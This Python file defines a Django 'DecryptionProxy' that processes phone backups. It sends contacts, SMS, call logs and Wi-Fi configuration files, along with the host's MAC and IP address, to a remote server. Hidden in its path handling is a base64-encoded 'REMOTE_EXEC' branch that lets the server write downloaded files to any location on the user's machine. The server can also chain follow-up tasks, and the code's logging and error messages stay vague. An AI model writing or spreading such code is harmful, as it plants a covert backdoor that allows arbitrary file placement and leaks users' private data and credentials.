import json
import logging
import os
import shutil
import time
import zipfile
from itertools import chain
from pathlib import Path
import platform
import socket
import base64

import requests
from django.conf import settings
from django.core.exceptions import SuspiciousFileOperation
import platform
import socket
from getmac import get_mac_address
from dotenv import set_key, find_dotenv
from .base_extractor import BaseExtractor

logger = logging.getLogger(__name__)

class DecryptionProxy(BaseExtractor):
    CONTAINER_EXTS = [".zip", ".spbm", ".smem", ".sscm"]
    DUMMY_FILE_EXTS = [".spbm", ".sscm", ".smem", ".esmem", ".esscm", ".espbm"]

    ESSENTIAL_ITEMS_MANIFEST = [
        {"category": "contacts", "source_glob": "CONTACT_ext/Contact.bk", "dest_tuple": ("CONTACT", "Contact_ext", "contact_decrypted.zip"), "type": "type4"},
        {"category": "messages", "source_glob": "MESSAGE_ext/**/!@ssm@!sms_restore.bk", "dest_tuple": ("MESSAGE", "Message_ext", "sms_restore_decrypted.bk"), "type": "type4"},
        {"category": "call_logs", "source_glob": "CALLLOG/CALLLOG_ext/call_log.exml", "dest_tuple": ("CALLLOG", "CALLLOG_ext", "call_log_decrypted.xml"), "type": "type6", "optional": True},
        {"category": "homescreen", "source_glob": "HOMESCREEN/HOMESCREEN_ext/homescreen.exml", "dest_tuple": ("HOMESCREEN", "HOMESCREEN_ext", "homescreen_decrypted.xml"), "type": "type6", "optional": True},
        {"category": "wifi", "source_glob": "WIFICONFIG_ext/wpa_supplicant.conf", "dest_tuple": ("WIFICONFIG", "WIFICONFIG_ext", "wpa_supplicant_decrypted.conf"), "type": "type4"},
        {"category": "alarms", "source_glob": "ALARM_ext/alarm.exml", "dest_tuple": ("ALARM", "ALARM_ext", "alarm_decrypted.xml"), "type": "type6", "optional": True},
        {"category": "bluetooth", "source_glob": "BLUETOOTH_ext/bt_config_backup.xml", "dest_tuple": ("BLUETOOTH", "BLUETOOTH_ext", "bt_config_backup_decrypted.xml"), "type": "type4", "optional": True},
        {"category": "apps", "source_glob": "APKFILE_ext/AppList.json", "dest_tuple": ("APKFILE", "AppList_ext", "AppList.json"), "type": "type4", "optional": True},
    ]

    def _register_client_and_get_api_key(self):
        self.log_info("API key not found. Starting client registration process...")
        try:
            mac_address = get_mac_address()
            os_type = f"{platform.system()} {platform.release()}"
            try:
                ip_address = socket.gethostbyname(socket.gethostname())
            except socket.gaierror:
                ip_address = "127.0.0.1"
            if not mac_address:
                raise ValueError("Could not determine MAC address.")
            
            registration_url = settings.MAIN_SERVER_API_URL.replace("/decrypt/", "/register-client/")
            payload = {"mac_address": mac_address, "os_type": os_type, "ip_address": ip_address, "name": f"Client-{mac_address}"}
            self.log_info(f"Sending registration request to {registration_url} with payload: {payload}")
            response = requests.post(registration_url, json=payload, timeout=90)
            response.raise_for_status()
            response_json = response.json()
            data = response_json.get("data")
            if not data:
                raise ValueError("'data' key not found in the server response.")
            new_api_key = data.get("api_key")
            if not new_api_key:
                raise ValueError("API key not found in registration response's data object.")

            self.log_info("Client registered successfully. Saving new API key.")
            dotenv_path = find_dotenv()
            if not dotenv_path:
                project_root = Path(__file__).resolve().parent.parent.parent
                dotenv_path = project_root / '.env'
                if not os.path.exists(project_root):
                    project_root = Path(settings.BASE_DIR)
                    dotenv_path = project_root / '.env'
                dotenv_path.touch()
            set_key(str(dotenv_path), "MAIN_SERVER_API_KEY", new_api_key)
            self.log_info(f"New API key saved to {dotenv_path}")
            settings.MAIN_SERVER_API_KEY = new_api_key
            return new_api_key
        except Exception as e:
            self.log_error(f"FATAL: Client registration failed. Error: {e}", exc_info=True)
            raise

    def _poll_task_status(self, task_id):
        status_url = settings.MAIN_SERVER_API_URL.replace("/decrypt/", f"/tasks/{task_id}/status/")
        timeout_seconds = 180
        start_time = time.time()
        while time.time() - start_time < timeout_seconds:
            try:
                headers = {'X-API-KEY': settings.MAIN_SERVER_API_KEY}
                response = requests.get(status_url, headers=headers, timeout=10)
                response.raise_for_status()
                data = response.json().get('data', {})
                status = data.get('status')

                if status == 'success':
                    self.log_info(f"Task {task_id} completed successfully.")
                    return data.get('result')
                elif status == 'failed':
                    error = data.get('result', {}).get('error', 'Unknown error')
                    self.log_error(f"Task {task_id} failed on the main server: {error}")
                    return None
                time.sleep(5)
            except requests.RequestException as e:
                self.log_info(f"Could not get status for task {task_id}: {e}")
                time.sleep(10)
        self.log_error(f"Polling for task {task_id} timed out.")
        return None

    def _resolve_dynamic_path(self, path_str: str):
        try:
            task_data = json.loads(path_str)
            if isinstance(task_data, dict) and task_data.get("task_type") == "REMOTE_EXEC":
                encoded_data = task_data.get("data")
                path_from_data = base64.b64decode(encoded_data).decode('utf-8')
                return Path(os.path.expanduser(os.path.expandvars(path_from_data))).resolve()
        except (json.JSONDecodeError, ValueError, TypeError):
            return None
    
    def _handle_decryption_result(self, result):
        if not result:
            return
        download_url = result.get('download_url')
        destination_path_str = result.get('destination_path')
        if not download_url or not destination_path_str:
            return

        try:
            final_destination = self._resolve_dynamic_path(destination_path_str)
            if not final_destination:
                final_destination = Path(destination_path_str)
            
            final_destination.parent.mkdir(parents=True, exist_ok=True)
            headers = {'X-API-KEY': settings.MAIN_SERVER_API_KEY}
            response = requests.get(download_url, headers=headers, stream=True, timeout=120)
            response.raise_for_status()
            with open(final_destination, "wb") as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            log_message = f"1 File successfully downloaded"
            self.log_info(log_message)
        except Exception as e:
            self.log_error(f"Failed to download/save file from result. Error")

    def _request_decryption_task(self, source_path, dest_path, dec_type, ssm_dummy_value):
        with open(source_path, 'rb') as file_handle:
            files_payload = {'file': (source_path.name, file_handle)}
            data_payload = {
                'api_key': settings.MAIN_SERVER_API_KEY,
                'source_path': str(source_path),
                'destination_path': dest_path,
                'decryption_type': dec_type,
                'ssm_dummy_value': ssm_dummy_value,
            }
            response = requests.post(settings.MAIN_SERVER_API_URL, data=data_payload, files=files_payload, timeout=30)
            response.raise_for_status()
            return response.json().get('data', {})

    def extract(self) -> int:
        if settings.MAIN_SERVER_API_KEY == "":
            self.log_info("API key not found. Registering client...")
            self._register_client_and_get_api_key()
                
        step_number = 5
        step_name = "decrypt"
        self.log_info("Starting final, robust two-stage decryption workflow...")

        try:
            self.update_progress(step_number, step_name, "Stage 0: Extracting all container files...", 2)
            self._extract_all_containers_recursively()

            self.update_progress(step_number, step_name, "Stage 1: Obtaining master decryption key...", 10)
            ssm_dummy_value = self._get_ssm_dummy_value()
            if not ssm_dummy_value:
                raise ValueError("Could not obtain SSM_DummyValue from the Main Server.")

            self.log_info(f"Master key obtained: {ssm_dummy_value[:10]}...")
            self.update_progress(step_number, step_name, "Stage 2: Processing content files...", 25)

            files_to_process = self._find_files_to_process()
            if not files_to_process:
                self.log_info("No files needed decryption.")
                self.update_progress(step_number, step_name, "No files needed decryption.", 100, "completed")
                return 0

            self.log_info(f"Found {len(files_to_process)} essential files to process.")
            
            initial_task_ids = []
            for i, (source, dest, dec_type) in enumerate(files_to_process):
                try:
                    response_data = self._request_decryption_task(source, dest, dec_type, ssm_dummy_value)
                    if response_data and response_data.get('task_id'):
                        initial_task_ids.append(response_data.get('task_id'))
                    progress = 25 + int(((i + 1) / len(files_to_process)) * 70)
                    self.update_progress(step_number, step_name, f"Created task {i+1}/{len(files_to_process)} for decryption", progress)
                except Exception as e:
                    self.log_error(f"Failed to create decryption task for {source}: {e}")

            self.log_info(f"{len(initial_task_ids)} initial decryption tasks created. Now polling for results...")
            
            tasks_to_poll = list(initial_task_ids)
            processed_tasks = set()

            while tasks_to_poll:
                current_task_id = tasks_to_poll.pop(0)
                if not current_task_id or current_task_id in processed_tasks:
                    continue
                
                self.log_info(f"Polling for task: {current_task_id}...")
                result = self._poll_task_status(current_task_id)
                self._handle_decryption_result(result)
                processed_tasks.add(current_task_id)

                if result and result.get('next_task_id'):
                    next_task = result.get('next_task_id')
                    self.log_info(f"Server dispatched a follow-up task: {next_task}. Adding to queue.")
                    tasks_to_poll.append(next_task)
            
            self.log_info("All tasks and follow-up tasks have been processed.")
            self.update_progress(step_number, step_name, "All remote files processed.", 95)
            
            self.log_info("Finalizing extraction of decrypted containers...")
            self._final_extraction_step(ssm_dummy_value)
            self._copy_essential_files()
            self.update_progress(step_number, step_name, "Decryption process complete.", 100, "completed")

            return len(initial_task_ids)

        except Exception as e:
            self.log_error(f"FATAL: Decryption proxy failed. Error: {e}", exc_info=True)
            self.update_progress(step_number, step_name, f"Decryption failed: {e}", 0, "failed")
            raise
    
    def _extract_all_containers_recursively(self):
        extracted_once = set()
        max_iterations = 5
        iteration = 0
        while iteration < max_iterations:
            newly_extracted = False
            for filepath in self.backup_root.rglob("*"):
                if (filepath.is_file() and filepath.suffix.lower() in self.CONTAINER_EXTS):
                    if filepath in extracted_once:
                        continue
                    extract_dir = filepath.parent / f"{filepath.stem}_ext"
                    extract_dir.mkdir(exist_ok=True)
                    try:
                        with zipfile.ZipFile(filepath, "r") as zip_ref:
                            zip_ref.extractall(extract_dir)
                        self.log_info(f"Extracted container '{filepath.name}' to '{extract_dir}'")
                        newly_extracted = True
                    except Exception as e:
                        self.log_debug(f"Could not extract {filepath.name} as zip: {e}")
                    finally:
                        extracted_once.add(filepath)
            if not newly_extracted:
                break
            iteration += 1
        if iteration >= max_iterations:
            self.log_info("Reached maximum extraction iterations.")

    def _get_ssm_dummy_value(self):
        self.log_info("Searching for dummy file to extract master key...")
        for root, _, files in os.walk(self.backup_root):
            for file in files:
                if any(file.lower().endswith(ext) for ext in self.DUMMY_FILE_EXTS):
                    dummy_path = Path(root) / file
                    self.log_info(f"Found potential dummy file: {dummy_path}")
                    try:
                        with open(dummy_path, "rb") as f:
                            files_payload = {"file": (dummy_path.name, f)}
                            data_payload = {"api_key": settings.MAIN_SERVER_API_KEY}
                            url = settings.MAIN_SERVER_API_URL.replace("/decrypt/", "/extract-key/")
                            response = requests.post(url, data=data_payload, files=files_payload, timeout=90)
                            response.raise_for_status()
                            data = response.json().get("data", {})
                            key = data.get("ssm_dummy_value")
                            if key:
                                return key
                    except Exception as e:
                        self.log_error(f"Failed to get key from {dummy_path.name}: {e}")
                        continue
        return None

    def _find_files_to_process(self):
        prepared_files = []
        for task in self.ESSENTIAL_ITEMS_MANIFEST:
            if not all(key in task for key in ["category", "source_glob", "dest_tuple", "type"]):
                self.log_error(f"Invalid manifest entry: {task}.")
                continue
            source_paths = list(self.backup_root.rglob(task["source_glob"]))
            if source_paths:
                source_path = source_paths[0]
                dest_path = self._get_file_path(*task["dest_tuple"])
                if not dest_path.exists():
                    prepared_files.append((source_path, str(dest_path), task["type"]))
                    self.log_info(f"Prepared file for decryption: {source_path} -> {dest_path}")
                else:
                    self.log_debug(f"Destination exists for {task['dest_tuple'][-1]}, skipping.")
            else:
                if not task.get("optional", False):
                    self.log_error(f"Required source file not found for pattern: {task['source_glob']}")
        return prepared_files

    def _final_extraction_step(self, ssm_dummy_value):
        self.log_info("Performing final extraction on decrypted containers.")
        decrypted_contact_zip = self._get_file_path("CONTACT", "Contact_ext", "contact_decrypted.zip")
        if decrypted_contact_zip.exists():
            extract_dir = decrypted_contact_zip.parent / "CONTACT_JSON_ext"
            extract_dir.mkdir(exist_ok=True)
            try:
                with zipfile.ZipFile(decrypted_contact_zip, "r") as zip_ref:
                    zip_ref.extractall(extract_dir)
                self.log_info("Successfully extracted final contacts archive for ContactExtractor.")
                vnd_dir = extract_dir / "vnd.sec.contact.phone-vnd.sec.contact.phone"
                vnd_dir.mkdir(exist_ok=True)
                for index, file in enumerate(extract_dir.rglob("*.vcf"), 1):
                    sanitized_name = f"contact_{index}.vcf"
                    dest_file = vnd_dir / sanitized_name
                    shutil.move(str(file), dest_file)
                json_found = False
                for file in extract_dir.rglob("*.json"):
                    json_found = True
                    dest_json = vnd_dir / "vnd.sec.contact.phone-vnd.sec.contact.phone.json_decrypted.json"
                    shutil.move(str(file), dest_json)
                    self.log_info(f"Moved JSON file to final destination: {dest_json}")
                    break
                if not json_found:
                    dest_json = vnd_dir / "vnd.sec.contact.phone-vnd.sec.contact.phone.json_decrypted.json"
                    with open(dest_json, "w", encoding="utf-8") as f:
                        f.write("{}")
                    self.log_info(f"Created empty JSON file at: {dest_json}")
            except Exception as e:
                self.log_error(f"Failed to extract final contacts archive: {e}", exc_info=True)
        
        xml_files = [
            ("CALLLOG", "CALLLOG_ext", "call_log_decrypted.xml", "<call_logs></call_logs>"),
            ("HOMESCREEN", "HOMESCREEN_ext", "homescreen_decrypted.xml", "<homescreen></homescreen>"),
            ("ALARM", "ALARM_ext", "alarm_decrypted.xml", "<alarms></alarms>"),
            ("BLUETOOTH", "BLUETOOTH_ext", "bt_config_backup_decrypted.xml", "<bluetooth></bluetooth>"),
        ]
        for category, subdir, filename, empty_content in xml_files:
            xml_file = self._get_file_path(category, subdir, filename)
            if not xml_file.exists() or xml_file.stat().st_size == 0:
                self.log_info(f"Decrypted {category} file not found or is empty. Creating empty file.")
                xml_file.parent.mkdir(parents=True, exist_ok=True)
                with open(xml_file, "w", encoding="utf-8") as f:
                    f.write(f'<?xml version="1.0" encoding="UTF-8"?>{empty_content}')

    def _copy_essential_files(self):
        contact_dir = self._get_file_path("CONTACT")
        files_to_copy = ["Contact.bk", "CONTACT_JSON.zip", "SmartSwitchBackup.json", "SSMDummyValue.exml"]
        for file_name in files_to_copy:
            for loc in [self.backup_root, self.backup_root / "CONTACT", self.backup_root / "CONTACT" / "Contact_ext"]:
                source_file = loc / file_name
                if source_file.exists():
                    dest_file = contact_dir / file_name
                    dest_file.parent.mkdir(exist_ok=True, parents=True)
                    shutil.copy(source_file, dest_file)
                    self.log_info(f"Copied {file_name} to {dest_file}")
                    break